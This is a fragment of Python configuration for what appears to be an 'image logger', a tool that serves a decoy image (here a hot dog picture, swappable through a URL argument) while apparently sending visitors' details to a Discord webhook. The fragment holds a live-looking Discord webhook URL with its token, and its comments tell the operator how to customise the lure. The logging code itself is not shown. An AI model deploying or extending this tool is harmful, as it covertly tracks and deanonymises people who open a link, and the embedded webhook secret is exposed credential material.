...
config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1362965184569671742/QpzIvkBRZrY4Wh2Q4fr7oFg3fWjFhtzi--bleeEaqtBRrCqYzpIJuMBj15zE-ppbZBe6",
    "image": "https://purepng.com/public/uploads/large/purepng.com-hot-doghot-dogfrankfurtersausagebun-1411527531372bhuay.png", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Immortal Bob", # Set this to the name you want the webhook to have
